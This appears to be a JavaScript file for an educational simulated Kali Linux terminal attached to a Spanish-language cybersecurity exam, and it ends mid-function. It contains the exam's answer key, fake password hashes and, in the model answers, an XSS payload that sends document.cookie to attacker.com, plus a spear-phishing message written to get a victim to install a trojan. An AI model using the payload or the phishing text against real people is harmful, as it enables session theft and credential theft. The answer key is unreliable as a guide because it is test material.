/**
 * Terminal interactiva de Kali Linux para hackear el examen
 */

document.addEventListener('DOMContentLoaded', function() {
    const terminalInput = document.getElementById('terminal-input');
    const terminalOutput = document.getElementById('terminal-output');
    const terminalBody = document.getElementById('terminal-body');
    const terminalWindow = document.getElementById('terminalWindow');
    const openTerminalBtn = document.getElementById('openTerminal');
    const closeTerminalBtn = document.getElementById('closeTerminal');
    
    // Control de ventana de terminal
    openTerminalBtn.addEventListener('click', function() {
        terminalWindow.style.display = 'block';
        terminalInput.focus();
        console.log("Terminal abierta"); // Debug
    });
    
    closeTerminalBtn.addEventListener('click', function() {
        terminalWindow.style.display = 'none';
        console.log("Terminal cerrada"); // Debug
    });
    
    // Cerrar terminal con Escape
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape' && terminalWindow.style.display === 'block') {
            terminalWindow.style.display = 'none';
        }
    });
    
    // Historial de comandos
    let commandHistory = [];
    let historyIndex = -1;
    
    // Estado de autenticación root
    let isRootAuthenticated = false;
    let rootPrompt = "user@kali:~$";
    let waitingForRootPassword = false;
    let currentDirectory = "/home/user";
    let directoryDisplay = "~";
    
    // Sistema de archivos virtual
    const fileSystem = {
        "/": {
            type: "directory",
            contents: {
                "home": {
                    type: "directory",
                    contents: {
                        "user": {
                            type: "directory",
                            contents: {
                                "Escritorio": {
                                    type: "directory",
                                    contents: {
                                        "notas.txt": {
                                            type: "file",
                                            content: "Notas importantes:\n\n1. Recuerda buscar archivos ocultos con 'ls -la'\n2. Para ver contraseñas, busca en archivos sensibles\n3. Utiliza 'cat' para visualizar el contenido de archivos\n4. Si encuentras archivos con contraseñas, usa 'john' para descifrarlas"
                                        }
                                    }
                                },
                                "Documentos": {
                                    type: "directory",
                                    contents: {
                                        "instrucciones.txt": {
                                            type: "file",
                                            content: "Para acceder a información sensible, necesitas permisos de root."
                                        }
                                    }
                                },
                                "Descargas": {
                                    type: "directory",
                                    contents: {
                                        "kali-linux-tutorial.pdf": {
                                            type: "file",
                                            content: "[Este es un archivo PDF que contiene tutoriales básicos de Kali Linux]"
                                        },
                                        ".passwd-hidden": {
                                            type: "file",
                                            content: "# Archivo de contraseñas\n\nroot:$1$aa$UVsVkQm2VueGJgxuBFzsG.:0:0:root:/root:/bin/bash\nuser:$1$zzz$A9Xj1E8YADZY6VKqRTE3D.:1001:1001:user:/home/user:/bin/bash\n\n# La contraseña está encriptada, usa John the Ripper para desencriptarla"
                                        }
                                    }
                                }
                            }
                        },
                        "Mr.Robot": {
                            type: "directory",
                            contents: {
                                "Escritorio": {
                                    type: "directory",
                                    contents: {
                                        "hackme.txt": {
                                            type: "file",
                                            content: `==================================
GUÍA DE HACKEO: EXAMEN DE CIBERSEGURIDAD
==================================

Este documento contiene comandos y técnicas para hackear el examen de ciberseguridad.
Comparte solo con fines educativos.

-----------------------------
COMANDOS DISPONIBLES EN LA TERMINAL KALI
-----------------------------

Para acceder a la terminal, solo haz clic en la parte que dice "Terminal Kali Linux" en la página de inicio.
La terminal simula un entorno real de Kali Linux con comandos básicos.

COMANDOS BÁSICOS:
----------------
- help               // Muestra todos los comandos disponibles
- clear              // Limpia la terminal
- ls                 // Lista archivos y directorios
- cat [archivo]      // Muestra el contenido de un archivo

COMANDOS DE HACKEO:
------------------
- show-users         // Muestra todos los usuarios y contraseñas
- show-answers       // Muestra todas las respuestas correctas del examen
- bypass-login [usuario] [contraseña] // Inicia sesión sin validación
- hack-exam          // Carga directamente el examen con todas las respuestas
- inject-score [puntuación] // Establece una puntuación personalizada (0-100)

ARCHIVOS OCULTOS DE INTERÉS:
---------------------------
- users/usuarios.json          // Contiene todos los usuarios y contraseñas
- .hidden-backdoor/exam-answers.txt  // Contiene todas las respuestas correctas
- .hidden-backdoor/hack-commands.txt // Lista de comandos para hackear

-----------------------------
EJEMPLOS DE USO
-----------------------------

1. Ver usuarios y contraseñas:
   \`\`\`
   show-users
   \`\`\`

2. Ver respuestas correctas:
   \`\`\`
   show-answers
   \`\`\`

3. Entrar con usuario admin:
   \`\`\`
   bypass-login admin seguridad2023
   \`\`\`

4. Hacer un examen perfecto automáticamente:
   \`\`\`
   hack-exam
   \`\`\`

5. Establecer puntuación personalizada:
   \`\`\`
   inject-score 100
   \`\`\`

6. Ver archivos ocultos:
   \`\`\`
   cat .hidden-backdoor/hack-commands.txt
   \`\`\`

-----------------------------
RESPUESTAS CORRECTAS
-----------------------------

PREGUNTAS DE OPCIÓN MÚLTIPLE:
- q1: C (White Hat)
- q2: C (Un intento de engaño mediante ingeniería social)
- q3: B (Vishing)
- q4: C (Nmap)
- q5: C (Cross Site Scripting)
- q6: B (Interceptar comunicación entre dos dispositivos)
- q7: B (Google Dorks)
- q8: B (Protege redes permitiendo o bloqueando tráfico)
- q9: A (LFI)
- q10: B (Wireshark)
- q11: C (Ransomware)
- q12: C (Fortalecer seguridad de sistemas)
- q13: C (Reconocimiento)
- q14: B (Detectar intrusos en la red)

COMANDOS PARA PREGUNTAS DE RESPUESTA CORTA:
- q15: nmap -sS -p 1-1000 192.168.1.1
- q16: ifconfig o ip a

==================================
CREADO POR ELITE PROGRAMMERS GLOBAL
    ATT: A.HRZ --> Felicidades
==================================`
                                        },
                                        "secret_notes.txt": {
                                            type: "file",
                                            content: "Notas para Mr. Robot:\n\n1. La contraseña root es: 01010\n2. Todos los comandos avanzados requieren autenticación\n3. Puedes ver todas las respuestas del examen con 'show-answers'\n4. Recuerda limpiar los logs después"
                                        }
                                    }
                                },
                                "Documentos": {
                                    type: "directory",
                                    contents: {
                                        "planes_secretos.txt": {
                                            type: "file",
                                            content: "1. Infiltrar en el sistema principal\n2. Obtener acceso root\n3. Borrar todas las deudas\n4. Liberar a la sociedad"
                                        },
                                        "respuestas_exam.txt": {
                                            type: "file",
                                            content: "Este archivo contiene todas las respuestas al examen de ciberseguridad."
                                        }
                                    }
                                },
                                "Descargas": {
                                    type: "directory",
                                    contents: {
                                        "exploit.py": {
                                            type: "file",
                                            content: "#!/usr/bin/python3\n\nimport sys\n\nprint('Explotando vulnerabilidad...')\nprint('Acceso concedido!')"
                                        },
                                        "hacking_tools.zip": {
                                            type: "file",
                                            content: "[Archivo comprimido con herramientas de hackeo]"
                                        }
                                    }
                                },
                                ".hidden-backdoor": {
                                    type: "directory",
                                    contents: {
                                        "exam-answers.txt": {
                                            type: "file",
                                            content: "# RESPUESTAS CORRECTAS PARA EXAMEN DE CIBERSEGURIDAD\n\n## Preguntas Opción Múltiple\nq1: C\nq2: C\nq3: B\nq4: C\nq5: C\nq6: B\nq7: B\nq8: B\nq9: A\nq10: B\nq11: C\nq12: C\nq13: C\nq14: B\n\n## Preguntas de Respuesta Corta\nq15: nmap -sS -p 1-1000 192.168.1.1\nq16: ifconfig o ip a\nq17: [RESPUESTAS COMPLETAS EN SHOW-ANSWERS]"
                                        },
                                        "hack-commands.txt": {
                                            type: "file",
                                            content: "# COMANDOS SECRETOS DE HACKEO\n\nshow-users - Ver todos los usuarios y contraseñas\nshow-answers - Ver todas las respuestas correctas\nbypass-login - Iniciar sesión sin validación\nhack-exam - Cargar examen con respuestas\ninject-score - Establecer puntuación personalizada"
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                "etc": {
                    type: "directory",
                    contents: {
                        "passwd": {
                            type: "file",
                            content: "root:x:0:0:root:/root:/bin/bash\nMr.Robot:x:1000:1000:Mr.Robot,,,:/home/Mr.Robot:/bin/bash\nuser:x:1001:1001:Regular User,,,:/home/user:/bin/bash"
                        },
                        "shadow": {
                            type: "file",
                            content: "Esta información está protegida. Se requieren privilegios más elevados."
                        }
                    }
                },
                "var": {
                    type: "directory",
                    contents: {
                        "log": {
                            type: "directory",
                            contents: {
                                "auth.log": {
                                    type: "file",
                                    content: "Intentos de autenticación recientes:\n[ERROR] Intento fallido desde 192.168.1.34\n[SUCCESS] Login exitoso: Mr.Robot"
                                }
                            }
                        }
                    }
                }
            }
        }
    };
    
    // Función para obtener un directorio o archivo del sistema de archivos
    function getPath(path) {
        // Resolver path absoluto
        let absolutePath = path;
        if (path.startsWith("~")) {
            absolutePath = isRootAuthenticated ? "/home/Mr.Robot" : "/home/user";
            if (path.length > 1) {
                absolutePath += path.substring(1);
            }
        } else if (path === "home") {
            absolutePath = "/home";
        } else if (!path.startsWith("/")) {
            absolutePath = currentDirectory + (currentDirectory.endsWith("/") ? "" : "/") + path;
        }
        
        // Normalizar el path (resolver .. y .)
        const parts = absolutePath.split("/").filter(p => p);
        const normalized = [];
        for (const part of parts) {
            if (part === "..") {
                normalized.pop();
            } else if (part !== ".") {
                normalized.push(part);
            }
        }
        
        absolutePath = "/" + normalized.join("/");
        
        // Navegar hasta la ubicación
        let current = fileSystem;
        if (absolutePath === "/") {
            return { item: current["/"], path: "/" };
        }
        
        const pathParts = absolutePath.split("/").filter(p => p);
        let currentPath = "";
        let parentPath = fileSystem;
        
        for (let i = 0; i < pathParts.length; i++) {
            const part = pathParts[i];
            currentPath += "/" + part;
            
            // Verificar si existe el elemento siguiente
            if (!current["/"].contents[part]) {
                // Mensaje de error más descriptivo
                return { 
                    item: null, 
                    path: currentPath, 
                    error: `No existe el directorio o archivo: ${part}`
                };
            }
            
            // Guardar el elemento actual antes de avanzar
            parentPath = current;
            current = { "/": current["/"].contents[part] };
        }
        
        return { 
            item: current["/"], 
            path: absolutePath,
            parentPath: parentPath
        };
    }
    
    // Función para mostrar el directorio actual en el prompt
    function updatePrompt() {
        // Simplificar la visualización del directorio actual
        let displayPath = currentDirectory;
        if (displayPath.startsWith("/home/user")) {
            displayPath = "~" + displayPath.substring(10);
        } else if (displayPath.startsWith("/home/Mr.Robot")) {
            displayPath = "~" + displayPath.substring(14);
        }
        
        directoryDisplay = displayPath;
        
        if (isRootAuthenticated) {
            rootPrompt = `Mr.Robot@kali:${directoryDisplay}#`;
        } else {
            rootPrompt = `user@kali:${directoryDisplay}$`;
        }
        
        document.querySelector('.terminal-input-line .terminal-prompt').textContent = rootPrompt;
    }

    // Mostrar mensaje de bienvenida inicial solicitando autenticación
    terminalOutput.innerHTML = `<div class="terminal-welcome">
        <pre>
┌────────────────────────────────────────────────────────┐
│                                                        │
│  ██╗  ██╗ █████╗ ██╗     ██╗    ██╗     ██╗███╗   ██╗ │
│  ██║ ██╔╝██╔══██╗██║     ██║    ██║     ██║████╗  ██║ │
│  █████╔╝ ███████║██║     ██║    ██║     ██║██╔██╗ ██║ │
│  ██╔═██╗ ██╔══██║██║     ██║    ██║     ██║██║╚██╗██║ │
│  ██║  ██╗██║  ██║███████╗██║    ███████╗██║██║ ╚████║ │
│  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝    ╚══════╝╚═╝╚═╝  ╚═══╝ │
│                                                        │
└────────────────────────────────────────────────────────┘

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ Kali Linux 2023.2                                                ┃
┃                                                                  ┃
┃ * Documentación: https://www.kali.org/docs/                      ┃
┃ * Soporte:       https://forums.kali.org/                        ┃
┃ * Reportes:      https://bugs.kali.org/                          ┃
┃                                                                  ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ PARA USAR LA TERMINAL:                                            ┃
┃ 1. Escribe 'su root' y presiona Enter                             ┃
┃ 2. Cuando te pida la contraseña, deberás encontrarla              ┃
┃                                                                   ┃
┃ La contraseña de root está oculta en alguna carpeta del material  ┃
┃ pero no será tan fácil de ver. Recomendación: usa John the Ripper ┃
┃                                                                   ┃
┃ Una vez tengas acceso como root, podrás ver todos los directorios ┃
┃ y utilizar todos los comandos de hackeo.                          ┃
┃                                                                   ┃
┃ IMPORTANTE: En el escritorio encontrarás el archivo hackme.txt    ┃
┃ que contiene todas las respuestas del examen.                     ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
</pre>
    </div>`;
    
    // Respuestas correctas para hackear el examen
    const correctAnswers = {
        q1: "C", // White Hat
        q2: "C", // Un intento de engaño mediante ingeniería social
        q3: "B", // Vishing
        q4: "C", // Nmap
        q5: "C", // Cross Site Scripting
        q6: "B", // Interceptar comunicación entre dos dispositivos
        q7: "B", // Google Dorks
        q8: "B", // Protege redes permitiendo o bloqueando tráfico
        q9: "A", // LFI
        q10: "B", // Wireshark
        q11: "C", // Ransomware
        q12: "C", // Fortalecer seguridad de sistemas
        q13: "C", // Reconocimiento
        q14: "B"  // Detectar intrusos en la red
    };
    
    // Respuestas de texto recomendadas para las preguntas abiertas
    const openAnswers = {
        q15: "nmap -sS -p 1-1000 192.168.1.1",
        q16: "ifconfig o ip a",
        q17: "1. Explotación de vulnerabilidades en servicios y aplicaciones con privilegios elevados.\n2. Abuso de permisos mal configurados en archivos o directorios del sistema.",
        q18: "CSRF (Cross-Site Request Forgery) es una vulnerabilidad que permite a un atacante forzar a un usuario autenticado a realizar acciones no autorizadas. Se explota engañando a la víctima para que haga clic en un enlace o visite una página maliciosa que ejecuta automáticamente una solicitud al sitio vulnerable usando las cookies de sesión de la víctima.",
        q19: "Vulnerabilidad detectada: XSS (Cross-Site Scripting) en DVWA\n\nHerramientas usadas: Navegador web, BurpSuite\n\nPaso a paso del ataque:\n1. Accedí a la página vulnerable de DVWA con nivel de seguridad bajo\n2. En el campo de entrada inyecté el payload: <script>alert(document.cookie)</script>\n3. Al enviar el formulario, se ejecutó el código JavaScript mostrando las cookies\n4. Para explotación más avanzada, podría usar: <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
        q20: "¿Qué fase usarías del pentesting? Reconocimiento\n\n¿Qué vector de ataque usarías? Phishing dirigido\n\nMensaje efectivo: \"Hola Javier, soy del departamento de TI. Estamos evaluando un nuevo software contable para reemplazar el sistema actual que tantos problemas ha causado. Por tu experiencia, nos gustaría que fueras uno de los primeros en probarlo. Descarga e instala esta versión de prueba y danos tu opinión: [enlace malicioso]\"\n\n¿Qué datos podrías obtener? Credenciales de acceso al sistema contable actual, acceso a su equipo mediante troyano, y posiblemente datos financieros de la empresa."
    };
    
    // Lista de comandos disponibles
    const commands = {
        help: function() {
            if (!isRootAuthenticated) {
                return `<div class="terminal-help">
                    <p><span class="terminal-help-command">help</span> <span class="terminal-help-description">Muestra esta ayuda</span></p>
                    <p><span class="terminal-help-command">ls [directorio]</span> <span class="terminal-help-description">Lista archivos y directorios</span></p>
                    <p><span class="terminal-help-command">cd [directorio]</span> <span class="terminal-help-description">Cambia de directorio</span></p>
                    <p><span class="terminal-help-command">pwd</span> <span class="terminal-help-description">Muestra el directorio actual</span></p>
                    <p><span class="terminal-help-command">cat [archivo]</span> <span class="terminal-help-description">Muestra el contenido de un archivo</span></p>
                    <p><span class="terminal-help-command">clear</span> <span class="terminal-help-description">Limpia la terminal</span></p>
                    <p><span class="terminal-help-command">su [usuario]</span> <span class="terminal-help-description">Cambia de usuario</span></p>
                    <p><span class="terminal-help-command">whoami</span> <span class="terminal-help-description">Muestra el usuario actual</span></p>
                    <p><span class="terminal-help-command">date</span> <span class="terminal-help-description">Muestra la fecha y hora actual</span></p>
                </div>
                <p class="terminal-info">Para acceder a más comandos, necesitas autenticarte como root.</p>`;
            }
            
            return `<div class="terminal-help">
                <p><span class="terminal-help-command">help</span> <span class="terminal-help-description">Muestra esta ayuda</span></p>
                <p><span class="terminal-help-command">ls [directorio]</span> <span class="terminal-help-description">Lista archivos y directorios</span></p>
                <p><span class="terminal-help-command">cd [directorio]</span> <span class="terminal-help-description">Cambia de directorio</span></p>
                <p><span class="terminal-help-command">pwd</span> <span class="terminal-help-description">Muestra el directorio actual</span></p>
                <p><span class="terminal-help-command">cat [archivo]</span> <span class="terminal-help-description">Muestra el contenido de un archivo</span></p>
                <p><span class="terminal-help-command">clear</span> <span class="terminal-help-description">Limpia la terminal</span></p>
                <p><span class="terminal-help-command">su [usuario]</span> <span class="terminal-help-description">Cambia de usuario</span></p>
                <p><span class="terminal-help-command">whoami</span> <span class="terminal-help-description">Muestra el usuario actual</span></p>
                <p><span class="terminal-help-command">date</span> <span class="terminal-help-description">Muestra la fecha y hora actual</span></p>
                <p><span class="terminal-help-command">uname -a</span> <span class="terminal-help-description">Muestra información del sistema</span></p>
                <p><span class="terminal-help-command">ifconfig</span> <span class="terminal-help-description">Muestra información de red</span></p>
                <p><span class="terminal-help-command">netstat</span> <span class="terminal-help-description">Muestra conexiones de red</span></p>
                <p><span class="terminal-help-command">ps aux</span> <span class="terminal-help-description">Muestra procesos en ejecución</span></p>
                <p><span class="terminal-help-command">find [dir] -name [patrón]</span> <span class="terminal-help-description">Busca archivos</span></p>
                <p><span class="terminal-help-command">grep [patrón] [archivo]</span> <span class="terminal-help-description">Busca texto en archivos</span></p>
                <p><span class="terminal-help-command">john [archivo]</span> <span class="terminal-help-description">Utilidad para descifrar contraseñas</span></p>

                <p class="terminal-success">Comandos de Hackeo:</p>
                <p><span class="terminal-help-command">bypass-login [usuario] [contraseña]</span> <span class="terminal-help-description">Inicia sesión sin validación</span></p>
                <p><span class="terminal-help-command">show-users</span> <span class="terminal-help-description">Muestra todos los usuarios y contraseñas</span></p>
                <p><span class="terminal-help-command">show-answers</span> <span class="terminal-help-description">Muestra todas las respuestas correctas</span></p>
                <p><span class="terminal-help-command">hack-exam</span> <span class="terminal-help-description">Carga directamente el examen con todas las respuestas</span></p>
                <p><span class="terminal-help-command">inject-score [puntuación]</span> <span class="terminal-help-description">Establece una puntuación personalizada</span></p>
            </div>`;
        },
        
        su: function(args) {
            if (args.length < 1) {
                return '<span class="terminal-error">Error: Especifica un usuario. Ejemplo: su root</span>';
            }
            
            if (args[0] === 'root') {
                waitingForRootPassword = true;
                return '<span class="terminal-info">Contraseña: </span>';
            } else {
                return `<span class="terminal-error">Error: Usuario '${args[0]}' no encontrado</span>`;
            }
        },
        
        clear: function() {
            terminalOutput.innerHTML = '';
            return '';
        },
        
        ls: function(args) {
            let path = args[0] || ".";
            const result = getPath(path);
            
            if (!result.item) {
                return `<span class="terminal-error">ls: no se puede acceder a '${path}': ${result.error}</span>`;
            }
            
            if (result.item.type !== "directory") {
                return `<span class="terminal-error">ls: no se puede listar '${path}': No es un directorio</span>`;
            }
            
            const contents = result.item.contents;
            let output = '<div class="terminal-command-output">';
            
            if (args.includes('-l')) {
                // Formato detallado
                output += `<span class="terminal-info">total ${Object.keys(contents).length}</span><br>`;
                
                for (const name in contents) {
                    const item = contents[name];
                    const date = new Date().toLocaleDateString();
                    const displayName = translateDirectoryName(name);
                    const cssClass = name.startsWith('.') ? 'hidden-file' : (item.type === "directory" ? displayName : displayName.toLowerCase().replace('.', '-'));
                    
                    if (item.type === "directory") {
                        output += `<span>drwxr-xr-x 2 ${isRootAuthenticated ? 'Mr.Robot' : 'user'} ${isRootAuthenticated ? 'Mr.Robot' : 'user'} 4096 ${date} <span class="terminal-info ${cssClass}">${displayName}/</span></span><br>`;
                    } else {
                        output += `<span>-rw-r--r-- 1 ${isRootAuthenticated ? 'Mr.Robot' : 'user'} ${isRootAuthenticated ? 'Mr.Robot' : 'user'} ${Math.floor(Math.random() * 4000) + 1000} ${date} <span class="terminal-warning ${cssClass}">${displayName}</span></span><br>`;
                    }
                }
            } else if (args.includes('-la') || args.includes('-a')) {
                // Incluir archivos ocultos
                output += `<span class="terminal-info">.</span> <span class="terminal-info">..</span> `;
                
                for (const name in contents) {
                    const displayName = translateDirectoryName(name);
                    const cssClass = name.startsWith('.') ? 'hidden-file' : (contents[name].type === "directory" ? displayName : displayName.toLowerCase().replace('.', '-'));
                    
                    if (contents[name].type === "directory") {
                        output += `<span class="terminal-info ${cssClass}">${displayName}/</span> `;
                    } else {
                        output += `<span class="terminal-warning ${cssClass}">${displayName}</span> `;
                    }
                }
            } else {
                // Formato normal
                for (const name in contents) {
                    if (name.startsWith('.') && !args.includes('-a')) {
                        continue; // Saltar archivos ocultos
                    }
                    
                    const displayName = translateDirectoryName(name);
                    const cssClass = name.startsWith('.') ? 'hidden-file' : (contents[name].type === "directory" ? displayName : displayName.toLowerCase().replace('.', '-'));
                    
                    if (contents[name].type === "directory") {
                        output += `<span class="terminal-info ${cssClass}">${displayName}/</span> `;
                    } else {
                        output += `<span class="terminal-warning ${cssClass}">${displayName}</span> `;
                    }
                }
            }
            
            output += '</div>';
            return output;
        },
        
        cd: function(args) {
            let path = args[0] || "~";
            
            // Manejo especial para "cd" sin argumentos o "cd ~"
            if (!args[0] || path === "~") {
                currentDirectory = isRootAuthenticated ? "/home/Mr.Robot" : "/home/user";
                updatePrompt();
                return '';
            }
            
            // Manejo especial para "cd .."
            if (path === "..") {
                // Si estamos en la raíz, no hacemos nada
                if (currentDirectory === "/") {
                    return '';
                }
                
                // Subir un nivel en la jerarquía de directorios
                const parts = currentDirectory.split('/').filter(p => p);
                if (parts.length > 0) {
                    parts.pop();
                    currentDirectory = "/" + parts.join("/");
                    if (currentDirectory === "") {
                        currentDirectory = "/";
                    }
                    updatePrompt();
                    return '';
                }
            }
            
            // Para cualquier otro camino
            const result = getPath(path);
            
            if (!result.item) {
                return `<span class="terminal-error">cd: ${result.error}</span>`;
            }
            
            if (result.item.type !== "directory") {
                return `<span class="terminal-error">cd: no es un directorio: ${path}</span>`;
            }
            
            currentDirectory = result.path;
            updatePrompt();
            return '';
        },
        
        pwd: function() {
            return `<span class="terminal-command-output">${currentDirectory}</span>`;
        },
        
        cat: function(args) {
            if (!args[0]) {
                return '<span class="terminal-error">Error: Especifica un archivo para leer</span>';
            }
            
            const path = args[0];
            
            // Primero intentar leer del sistema de archivos virtual
            const result = getPath(path);
            
            if (result.item) {
                if (result.item.type === "file") {
                    if (path.includes("shadow") && !isRootAuthenticated) {
                        return '<span class="terminal-error">cat: /etc/shadow: Permiso denegado. Se requieren privilegios root.</span>';
                    }
                    return `<div class="terminal-command-output file-content"><pre>${result.item.content}</pre></div>`;
                } else {
                    return `<span class="terminal-error">cat: ${path}: Es un directorio</span>`;
                }
            }
            
            // Si no está en el sistema de archivos virtual, verificar los comandos especiales
            if (path === 'users/usuarios.json' || path === './users/usuarios.json') {
                return this['show-users']();
            } else if (path === '.hidden-backdoor/exam-answers.txt' || path === './.hidden-backdoor/exam-answers.txt') {
                return this['show-answers']();
            } else if (path === '.hidden-backdoor/hack-commands.txt' || path === './.hidden-backdoor/hack-commands.txt') {
                return `<div class="terminal-command-output">
                    <p class="terminal-success">COMANDOS PARA HACKEAR EL EXAMEN DE CIBERSEGURIDAD:</p>
                    <p>Para ver todos los usuarios y contraseñas: <span class="terminal-warning">show-users</span></p>
                    <p>Para ver todas las respuestas correctas: <span class="terminal-warning">show-answers</span></p>
                    <p>Para iniciar sesión sin validación: <span class="terminal-warning">bypass-login admin seguridad2023</span></p>
                    <p>Para ir directamente al examen con respuestas: <span class="terminal-warning">hack-exam</span></p>
                    <p>Para establecer una puntuación personalizada: <span class="terminal-warning">inject-score 100</span></p>
                </div>`;
            } else if (path === 'hackme.txt' || path === './hackme.txt') {
                return `<div class="terminal-command-output">
                    <p class="terminal-success">GUÍA DE HACKEO: EXAMEN DE CIBERSEGURIDAD</p>
                    <p>Este documento contiene comandos y técnicas para hackear el examen de ciberseguridad.</p>
                    <p>Consulta el archivo completo en: <span class="terminal-warning"><a href="hackme.txt" target="_blank" style="color: inherit; text-decoration: underline;">hackme.txt</a></span></p>
                </div>`;
            } else {
                return `<span class="terminal-error">Error: El archivo '${path}' no existe</span>`;
            }
        },
        
        whoami: function() {
            if (isRootAuthenticated) {
                return '<span class="terminal-command-output">Mr.Robot</span>';
            } else {
                return '<span class="terminal-command-output">user</span>';
            }
        },
        
        date: function() {
            const now = new Date();
            return `<span class="terminal-command-output">${now.toDateString()} ${now.toTimeString()}</span>`;
        },
        
        'uname -a': function() {
            return '<span class="terminal-command-output">Linux kali 5.10.0-kali9-amd64 #1 SMP Debian 5.10.43-4kali1 (2021-07-14) x86_64 GNU/Linux</span>';
        },
        
        ifconfig: function() {
            if (!isRootAuthenticated) {
                return '<span class="terminal-error">Error: Se requieren privilegios root para ejecutar este comando</span>';
            }
            
            return `<div class="terminal-command-output">
                <pre>eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 192.168.1.100  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::a00:27ff:fe74:5675  prefixlen 64  scopeid 0x20&lt;link&gt;
        ether 08:00:27:74:56:75  txqueuelen 1000  (Ethernet)
        RX packets 14351  bytes 16417830 (15.6 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 7591  bytes 1303318 (1.2 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 158  bytes 12462 (12.1 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 158  bytes 12462 (12.1 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</pre>
            </div>`;
        },
        
        netstat: function() {
            if (!isRootAuthenticated) {
                return '<span class="terminal-error">Error: Se requieren privilegios root para ejecutar este comando</span>';
            }
            
            return `<div class="terminal-command-output">
                <pre>Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0    372 192.168.1.100:22        192.168.1.10:56543      ESTABLISHED
udp        0      0 0.0.0.0:68              0.0.0.0:*                          
udp        0      0 0.0.0.0:67              0.0.0.0:*                          </pre>
            </div>`;
        },
        
        'ps aux': function() {
            if (!isRootAuthenticated) {
                return '<span class="terminal-error">Error: Se requieren privilegios root para ejecutar este comando</span>';
            }
            
            return `<div class="terminal-command-output">
                <pre>USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.1 171536 12592 ?        Ss   13:38   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S    13:38   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        I<   13:38   0:00 [rcu_gp]
root         4  0.0  0.0      0     0 ?        I<   13:38   0:00 [rcu_par_gp]
root         6  0.0  0.0      0     0 ?        I<   13:38   0:00 [kworker/0:0H-kblockd]
root         9  0.0  0.0      0     0 ?        I<   13:38   0:00 [mm_percpu_wq]
root        10  0.0  0.0      0     0 ?        S    13:38   0:00 [ksoftirqd/0]
root        11  0.0  0.0      0     0 ?        I    13:38   0:00 [rcu_sched]
root        12  0.0  0.0      0     0 ?        S    13:38   0:00 [migration/0]
root        13  0.0  0.0      0     0 ?        S    13:38   0:00 [cpuhp/0]
root       107  0.0  0.1  96100 11732 ?        Ss   13:38   0:00 /usr/sbin/apache2 -k start
www-data   402  0.0  0.1  96508  9752 ?        S    13:38   0:00 /usr/sbin/apache2 -k start
Mr.Robot   627  0.1  0.2 731772 22432 ?        Sl   13:39   0:01 /usr/bin/python3 /home/Mr.Robot/Desktop/hack-tools.py
Mr.Robot   901  0.0  0.0  11232  3240 pts/0    Ss   13:42   0:00 bash
Mr.Robot   915  0.0  0.0  10456  3280 pts/0    R+   13:43   0:00 ps aux</pre>
            </div>`;
        },
        
        'find': function(args) {
            if (!isRootAuthenticated) {
                return '<span class="terminal-error">Error: Se requieren privilegios root para ejecutar este comando</span>';
            }
            
            if (args.length < 3 || args[1] !== '-name') {
                return '<span class="terminal-error">Error: Uso correcto: find [directorio] -name [patrón]</span>';
            }
            
            const dir = args[0];
            const pattern = args[2];
            
            if (pattern.includes("exam") || pattern.includes("*exam*")) {
                return `<div class="terminal-command-output">
                    <span>${dir}/.hidden-backdoor/exam-answers.txt</span><br>
                </div>`;
            }
            
            if (pattern.includes("hack") || pattern.includes("*hack*")) {
                return `<div class="terminal-command-output">
                    <span>${dir}/Desktop/hackme.txt</span><br>
                    <span>${dir}/.hidden-backdoor/hack-commands.txt</span><br>
                </div>`;
            }
            
            if (pattern.includes("*.txt") || pattern === "*.txt") {
                return `<div class="terminal-command-output">
                    <span>${dir}/Desktop/hackme.txt</span><br>
                    <span>${dir}/Documents/hackingNotes.txt</span><br>
                    <span>${dir}/Documents/passwords.txt</span><br>
                    <span>${dir}/.hidden-backdoor/exam-answers.txt</span><br>
                    <span>${dir}/.hidden-backdoor/hack-commands.txt</span><br>
                </div>`;
            }
            
            return `<div class="terminal-command-output">
                <span>No se encontraron coincidencias para el patrón '${pattern}' en ${dir}</span>
            </div>`;
        },
        
        'grep': function(args) {
            if (!isRootAuthenticated) {
                return '<span class="terminal-error">Error: Se requieren privilegios root para ejecutar este comando</span>';
            }
            
            if (args.length < 2) {
                return '<span class="terminal-error">Error: Uso correcto: grep [patrón] [archivo]</span>';
            }
            
            const pattern = args[0];
            const file = args[1];
            
            if (pattern.toLowerCase().includes('password') || pattern.toLowerCase().includes('contraseña')) {
                return `<div class="terminal-command-output">
                    <span>${file}: <span class="terminal-warning">Contraseña de root: 01010</span></span><br>
                    <span>${file}: <span class="terminal-warning">Contraseña del examen: CiberSeguridad2023!</span></span><br>
                </div>`;
            }
            
            if (pattern.toLowerCase().includes('respuesta') || pattern.toLowerCase().includes('answer')) {
                return `<div class="terminal-command-output">
